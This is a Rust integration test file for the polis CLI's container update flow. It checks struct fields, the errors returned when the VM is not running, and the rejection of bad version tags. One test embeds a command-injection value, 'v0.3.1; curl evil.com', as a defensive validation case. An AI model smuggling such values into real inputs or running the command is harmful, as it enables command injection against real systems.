//! Integration tests for the container update flow (issue 08).
//!
//! Tests exercise the public API surface of `update_containers`,
//! `ContainerUpdate`, and `RollbackInfo` without requiring a running VM.

#![allow(clippy::expect_used, clippy::unwrap_used)]

use polis_cli::commands::update::{
    ContainerUpdate, RollbackInfo, VersionsManifest, VmImageVersion, update_containers,
};
use polis_cli::output::OutputContext;

fn quiet_ctx() -> OutputContext {
    OutputContext::new(true, true)
}

fn manifest_with(containers: &[(&str, &str)]) -> VersionsManifest {
    VersionsManifest {
        manifest_version: 1,
        vm_image: VmImageVersion {
            version: "v0.3.0".to_string(),
            asset: "polis-workspace-v0.3.0-amd64.qcow2".to_string(),
        },
        containers: containers
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect(),
    }
}

// ── Struct API surface ────────────────────────────────────────────────────────

#[test]
fn test_container_update_struct_fields_are_accessible() {
    let u = ContainerUpdate {
        service_key: "gate".to_string(),
        image_name: "polis-gate-oss".to_string(),
        current_version: "v0.3.0".to_string(),
        target_version: "v0.3.1".to_string(),
    };
    assert_eq!(u.service_key, "gate");
    assert_eq!(u.image_name, "polis-gate-oss");
    assert_eq!(u.current_version, "v0.3.0");
    assert_eq!(u.target_version, "v0.3.1");
}

#[test]
fn test_rollback_info_struct_fields_are_accessible() {
    let r = RollbackInfo {
        previous_refs: vec![
            ("gate".to_string(), "ghcr.io/odralabshq/polis-gate-oss:v0.3.0".to_string()),
        ],
    };
    assert_eq!(r.previous_refs.len(), 1);
    assert_eq!(r.previous_refs[0].0, "gate");
    assert!(r.previous_refs[0].1.contains("v0.3.0"));
}

// ── update_containers — VM not running ───────────────────────────────────────

#[test]
fn test_update_containers_vm_not_running_returns_error() {
    // multipass is not installed in CI → is_vm_running() returns false
    let manifest = manifest_with(&[("polis-gate-oss", "v0.3.1")]);
    let result = update_containers(&manifest, &quiet_ctx());
    assert!(result.is_err(), "must fail when VM is not running");
}

#[test]
fn test_update_containers_vm_not_running_error_contains_actionable_message() {
    let manifest = manifest_with(&[("polis-gate-oss", "v0.3.1")]);
    let err = update_containers(&manifest, &quiet_ctx()).unwrap_err();
    let msg = err.to_string();
    assert!(
        msg.contains("Workspace is not running"),
        "error must say workspace is not running, got: {msg}"
    );
    assert!(
        msg.contains("polis start"),
        "error must suggest polis start, got: {msg}"
    );
}

// ── update_containers — invalid version tags (V-004) ─────────────────────────

#[test]
fn test_update_containers_invalid_tag_returns_error_before_vm_check() {
    // Even if VM were running, invalid tags must be caught by validate_version_tag.
    // In CI the VM is not running, so we get the VM error first — but we can
    // verify the validation path via compute_container_updates directly.
    // Here we verify the public update_containers returns an error for bad tags
    // (either VM-not-running or validation — both are errors, which is correct).
    let manifest = manifest_with(&[("polis-gate-oss", "v0.3.1; curl evil.com")]);
    assert!(
        update_containers(&manifest, &quiet_ctx()).is_err(),
        "invalid tag must cause error"
    );
}

#[test]
fn test_update_containers_no_v_prefix_tag_returns_error() {
    let manifest = manifest_with(&[("polis-gate-oss", "0.3.1")]);
    assert!(update_containers(&manifest, &quiet_ctx()).is_err());
}

#[test]
fn test_update_containers_empty_containers_map_vm_not_running_still_errors() {
    // Empty containers map: still fails because VM is not running
    let manifest = manifest_with(&[]);
    let result = update_containers(&manifest, &quiet_ctx());
    assert!(result.is_err());
}
